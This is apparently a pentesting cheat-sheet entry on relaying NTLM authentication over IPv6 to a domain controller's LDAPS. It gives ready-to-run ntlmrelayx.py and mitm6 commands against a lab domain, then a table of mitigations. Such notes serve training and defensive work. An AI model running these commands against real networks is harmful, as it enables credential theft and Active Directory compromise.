Perform an NTLM relay attack using IPv6
```
ntlmrelayx.py -6 -t ldaps://<DC IP> -wh <FAKEWPAD HOSTNAME> -l <DIRECTORY NAME>
ntlmrelayx.py -6 -t ldaps://10.0.0.225 -wh fakewpad.local -l lootme
```
Set up `mitm6`
```
sudo mitm6 -d <DOMAIN>
sudo mitm6 -d MARVEL.local
```
## Mitigation
| **Methods**                                                                                                    | **Description**                                                                            | **Enhanced Information**                                                    |
| -------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------- |
| **Block (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPv6-In)**                 | Prevents incoming DHCPv6 traffic to stop malicious configuration.                          | Stops rogue DHCPv6 servers from altering client settings.                   |
| **Block (Inbound) Core Networking - Router Advertisement (ICMPv6-In)**                                         | Blocks ICMPv6 Router Advertisements to prevent routing manipulation.                       | Prevents attackers from redirecting traffic through malicious routes.       |
| **Block (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPv6-Out)**               | Stops outgoing DHCPv6 traffic to block malicious configurations.                           | Protects against clients receiving harmful configuration data.              |
| **If WPAD is not used internally, disable WinHttpAutoProxySvc service**                                        | Disables WPAD auto-discovery to prevent malicious proxy requests.                          | Reduces risk of WPAD-related attacks if not in use.                         |
| **Enable both LDAP signing and LDAP channel binding**                                                          | Signs and binds LDAP traffic to prevent tampering and unauthorized relaying.               | Ensures LDAP data integrity and security against relay attacks.             |
| **Move administrative users to the protected users group / Marking them as sensitive and cannot be delegated** | Moves high-privilege accounts to protected status to prevent delegation and impersonation. | Shields sensitive accounts from being exploited through delegation attacks. |
